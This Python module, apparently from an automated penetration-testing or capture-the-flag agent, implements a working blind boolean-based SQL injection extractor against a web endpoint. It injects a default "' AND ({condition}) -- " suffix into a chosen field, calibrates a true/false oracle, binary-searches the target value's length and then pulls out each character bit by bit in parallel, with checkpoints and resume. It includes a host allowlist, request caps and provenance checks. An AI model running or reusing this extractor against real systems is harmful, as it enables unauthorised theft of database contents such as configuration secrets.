"""Bounded, resumable boolean-oracle configuration extraction."""

from __future__ import annotations

import asyncio
import hashlib
import json
import time
from datetime import UTC, datetime
from typing import Any

from fastapi import HTTPException

from app.executors.http_executor import execute_http
from app.models import JobRequest
from app.workspace.paths import workspace_for
from app.executors.target_allowlist import target_allowed


def _require_provenance(args: dict[str, Any]) -> dict[str, Any]:
    required = ("target_expression", "expression_type", "supporting_evidence_ids", "supporting_fact_ids", "source_hypothesis_id", "approved_analysis_review_id", "assumption_status")
    missing = [key for key in required if key not in args]
    if missing:
        raise HTTPException(422, detail="SQL_EXPRESSION_PROVENANCE_REQUIRED: missing=" + ",".join(missing))
    if args.get("expression_type") not in {"METADATA_DISCOVERY", "VALUE_EXTRACTION", "FLAG_SEARCH"} or args.get("assumption_status") not in {"VERIFIED", "HYPOTHESIS"}:
        raise HTTPException(422, detail="SQL_EXPRESSION_PROVENANCE_REQUIRED: invalid provenance")
    if not str(args.get("target_expression") or "").strip() or not isinstance(args.get("supporting_evidence_ids"), list) or not args.get("supporting_evidence_ids") or not isinstance(args.get("supporting_fact_ids"), list) or not args.get("supporting_fact_ids") or not str(args.get("source_hypothesis_id") or "").strip() or not str(args.get("approved_analysis_review_id") or "").strip():
        raise HTTPException(422, detail="SQL_EXPRESSION_PROVENANCE_REQUIRED: incomplete provenance")
    expression = " ".join(str(args["target_expression"]).lower().split())
    if "select value from config" in expression:
        raise HTTPException(422, detail="SQL_EXPRESSION_PROVENANCE_REQUIRED: config.value requires verified schema promotion")
    return {key: args[key] for key in required}


def _spec(args: dict[str, Any]) -> dict[str, Any]:
    raw = args.get("request") if isinstance(args.get("request"), dict) else args
    value = {key: item for key, item in raw.items() if key in {"method", "url", "headers", "query", "json", "form", "body", "session_name", "cookie_ref", "timeout"}}
    value["method"] = str(value.get("method") or "POST").upper()
    value["url"] = str(value.get("url") or "")
    value["headers"] = dict(value.get("headers") or {})
    return value


def _set_field(spec: dict[str, Any], field: str, value: str) -> dict[str, Any]:
    result = json.loads(json.dumps(spec))
    container = "json" if isinstance(result.get("json"), dict) else "form" if isinstance(result.get("form"), dict) else "query"
    result.setdefault(container, {})[field] = value
    return result


def _oracle(result: dict[str, Any], oracle: dict[str, Any]) -> bool | None:
    body = str(result.get("body") or result.get("body_excerpt") or "")
    try:
        parsed = json.loads(body)
    except json.JSONDecodeError:
        parsed = {}
    current: Any = parsed
    for part in str(oracle.get("json_field") or "matched").split("."):
        if not isinstance(current, dict):
            return None
        current = current.get(part)
    true_value, false_value = oracle.get("true_value", True), oracle.get("false_value", False)
    if current == true_value or str(current).lower() == str(true_value).lower():
        return True
    if current == false_value or str(current).lower() == str(false_value).lower():
        return False
    return None


def _hash(value: Any) -> str:
    return hashlib.sha256(json.dumps(value, ensure_ascii=False, sort_keys=True, default=str).encode()).hexdigest()


async def boolean_config_extract(request: JobRequest) -> dict[str, Any]:
    args = dict(request.arguments)
    spec = _spec(args)
    field = str(args.get("test_field") or "")
    expression = str(args.get("target_expression") or args.get("expression") or "").strip().rstrip(";").strip()
    if not spec["url"] or not field or not expression:
        raise HTTPException(422, detail="request.url, test_field and target_expression are required")
    provenance = _require_provenance(args)
    if not target_allowed(spec["url"], request.allowed_hosts):
        raise HTTPException(403, detail="boolean extraction target is not allowlisted")
    root = workspace_for(request.run_id)
    job_id = str(args.get("job_id") or "unknown")
    output = root / "outputs" / "boolean-extract" / job_id
    evidence = root / "evidence" / "boolean-extract" / job_id
    output.mkdir(parents=True, exist_ok=True)
    evidence.mkdir(parents=True, exist_ok=True)
    progress_path, checkpoint_path, result_path, oracle_path = output / "progress.jsonl", output / "checkpoint.json", output / "result.json", evidence / "oracle.json"
    request_contract_path = evidence / "request-contract.json"
    max_requests = min(max(int(args.get("max_requests") or 64), 1), 512)
    timeout = min(max(float(args.get("timeout") or 15), 1), 30)
    delay = max(float(args.get("min_interval_seconds") or 0), 0)
    oracle_config = dict(args.get("oracle") or {})
    base = str(args.get("baseline_value") or "")
    true_suffix = str(args.get("true_suffix") or "' AND ({condition}) -- ")
    control_fields = dict(args.get("control_fields") or {})
    responses = 0
    last_request = 0.0
    progress: list[dict[str, Any]] = []
    request_spec_hash = _hash(spec)
    expression_hash = _hash(expression)
    oracle_hash = _hash(oracle_config)
    request_contract_path.write_text(
        json.dumps(
            {
                "run_id": request.run_id,
                "job_id": job_id,
                "request": {**spec, "headers": {key: "<redacted>" if key.lower() in {"authorization", "cookie", "set-cookie", "proxy-authorization"} else value for key, value in spec.get("headers", {}).items()}},
                "test_field": field,
                "control_fields": control_fields,
                "target_expression": expression,
                "provenance": provenance,
                "max_requests": max_requests,
                "max_length": min(int(args.get("max_length") or 64), 128),
            },
            ensure_ascii=False,
            indent=2,
        ),
        encoding="utf-8",
    )
    chars: list[str] = []
    checkpoint = {}
    request_lock = asyncio.Lock()
    if bool(args.get("resume")) and checkpoint_path.is_file():
        try:
            checkpoint = json.loads(checkpoint_path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            checkpoint = {}
        compatible = all(
            checkpoint.get(key) == value
            for key, value in {
                "run_id": request.run_id,
                "target_expression_hash": expression_hash,
                "request_spec_hash": request_spec_hash,
                "test_field": field,
                "oracle_hash": oracle_hash,
            }.items()
        )
        if compatible:
            partial = str(checkpoint.get("partial") or "")
            chars = list(partial)
            responses = int(checkpoint.get("requests") or 0)

    async def probe(condition: str) -> bool:
        nonlocal responses, last_request
        async with request_lock:
            if responses >= max_requests:
                raise RuntimeError("MAX_REQUESTS_REACHED")
            responses += 1
        wait = delay - (time.monotonic() - last_request)
        if wait > 0:
            await asyncio.sleep(wait)
        payload = true_suffix.format(condition=condition)
        value = base + payload
        candidate = _set_field(spec, field, value)
        for key, fixed in control_fields.items():
            candidate = _set_field(candidate, str(key), str(fixed))
        for attempt in range(3):
            last_request = time.monotonic()
            result = await execute_http(request.model_copy(update={"tool": "http_request", "arguments": {**candidate, "timeout": timeout}}))
            state = _oracle(result, oracle_config)
            if state is not None:
                return state
            status = int(result.get("status_code") or 0)
            if status == 429 or status >= 500:
                retry = min(2.0, float(result.get("retry_after") or 0.25) * (attempt + 1))
                await asyncio.sleep(retry)
                continue
            raise RuntimeError("ORACLE_RESPONSE_UNRECOGNIZED")
        raise RuntimeError("ORACLE_RETRY_EXHAUSTED")

    async def confirmed(condition: str, *, stable: bool = True) -> bool:
        if not stable:
            return await probe(condition)
        if delay <= 0:
            first, second = await asyncio.gather(probe(condition), probe(condition))
        else:
            first, second = await probe(condition), await probe(condition)
        if first != second:
            raise RuntimeError("ORACLE_UNSTABLE")
        return first

    try:
        true_state = await confirmed(str(args.get("calibration_true") or "1=1"))
        false_state = await confirmed(str(args.get("calibration_false") or "1=2"))
        if true_state == false_state:
            raise RuntimeError("ORACLE_NOT_DIFFERENTIAL")
        oracle_path.write_text(json.dumps({"json_field": oracle_config.get("json_field", "matched"), "true_value": true_state, "false_value": false_state, "requests": responses, "stable": True}, ensure_ascii=False, indent=2), encoding="utf-8")
        length = 0
        hi = min(int(args.get("max_length") or 64), 128)
        low = 0
        while low < hi:
            mid = (low + hi + 1) // 2
            if await confirmed(f"length(({expression})) >= {mid}", stable=False):
                low = mid
            else:
                hi = mid - 1
        length = low
        for position in range(len(chars) + 1, length + 1):
            # Extract independent bits concurrently. This preserves the
            # bounded request count while avoiding a long serial binary search
            # for every character on a high-latency target.
            hex_byte = f"((instr('0123456789ABCDEF',upper(substr(hex(substr(({expression}),{position},1)),1,1)))-1)*16+instr('0123456789ABCDEF',upper(substr(hex(substr(({expression}),{position},1)),2,1)))-1)"
            bits = await asyncio.gather(
                *(confirmed(f"(({hex_byte} & {1 << bit}) != 0)", stable=False) for bit in range(8))
            )
            value = sum((1 << bit) for bit, enabled in enumerate(bits) if enabled)
            chars.append(chr(value))
            entry = {"position": position, "value": "".join(chars), "requests": responses, "at": datetime.now(UTC).isoformat()}
            progress.append(entry)
            progress_path.write_text("".join(json.dumps(item, ensure_ascii=False) + "\n" for item in progress), encoding="utf-8")
            checkpoint_path.write_text(json.dumps({"status": "PARTIAL", "run_id": request.run_id, "target_expression_hash": expression_hash, "request_spec_hash": request_spec_hash, "test_field": field, "oracle_hash": oracle_hash, "position": position, "partial": "".join(chars), "requests": responses, "length": length}, ensure_ascii=False, indent=2), encoding="utf-8")
        extracted = "".join(chars)
        result = {"status": "COMPLETED", "summary": "Boolean configuration extraction completed", "structured_result": {"extracted_value": extracted, "length": length, "requests": responses, "oracle_verified": True, "oracle": {"true": true_state, "false": false_state}, "target_expression": expression, "provenance": provenance, "result_path": str(result_path.relative_to(root)).replace("\\", "/"), "checkpoint_path": str(checkpoint_path.relative_to(root)).replace("\\", "/"), "progress_path": str(progress_path.relative_to(root)).replace("\\", "/")}, "artifact_paths": [str(progress_path.relative_to(root)).replace("\\", "/"), str(checkpoint_path.relative_to(root)).replace("\\", "/"), str(result_path.relative_to(root)).replace("\\", "/"), str(oracle_path.relative_to(root)).replace("\\", "/"), str(request_contract_path.relative_to(root)).replace("\\", "/")], "progress_path": str(progress_path.relative_to(root)).replace("\\", "/"), "checkpoint_path": str(checkpoint_path.relative_to(root)).replace("\\", "/"), "result_path": str(result_path.relative_to(root)).replace("\\", "/")}
        checkpoint_path.write_text(json.dumps({"status": "COMPLETED", "run_id": request.run_id, "target_expression_hash": expression_hash, "request_spec_hash": request_spec_hash, "test_field": field, "oracle_hash": oracle_hash, "position": length, "partial": extracted, "requests": responses, "length": length}, ensure_ascii=False, indent=2), encoding="utf-8")
        result_path.write_text(json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8")
        oracle_path.write_text(json.dumps({"json_field": oracle_config.get("json_field", "matched"), "true_value": true_state, "false_value": false_state, "requests": responses}, ensure_ascii=False, indent=2), encoding="utf-8")
        return result
    except RuntimeError as error:
        partial = "".join(chars)
        status = "PARTIAL" if str(error) == "MAX_REQUESTS_REACHED" else "FAILED"
        checkpoint_path.write_text(json.dumps({"status": status, "error_code": str(error), "run_id": request.run_id, "target_expression_hash": expression_hash, "request_spec_hash": request_spec_hash, "test_field": field, "oracle_hash": oracle_hash, "position": len(chars), "requests": responses, "partial": partial}, ensure_ascii=False, indent=2), encoding="utf-8")
        if status == "PARTIAL":
            result = {"status": "PARTIAL", "summary": "Boolean configuration extraction reached its request budget", "structured_result": {"extracted_value": partial, "length": len(partial), "requests": responses, "oracle_verified": True, "target_expression": expression, "result_path": str(result_path.relative_to(root)).replace("\\", "/"), "checkpoint_path": str(checkpoint_path.relative_to(root)).replace("\\", "/"), "progress_path": str(progress_path.relative_to(root)).replace("\\", "/")}, "artifact_paths": [str(checkpoint_path.relative_to(root)).replace("\\", "/"), str(progress_path.relative_to(root)).replace("\\", "/"), str(request_contract_path.relative_to(root)).replace("\\", "/")], "checkpoint_path": str(checkpoint_path.relative_to(root)).replace("\\", "/"), "progress_path": str(progress_path.relative_to(root)).replace("\\", "/"), "result_path": str(result_path.relative_to(root)).replace("\\", "/")}
            result_path.write_text(json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8")
            return result
        raise HTTPException(422, detail=str(error)) from error
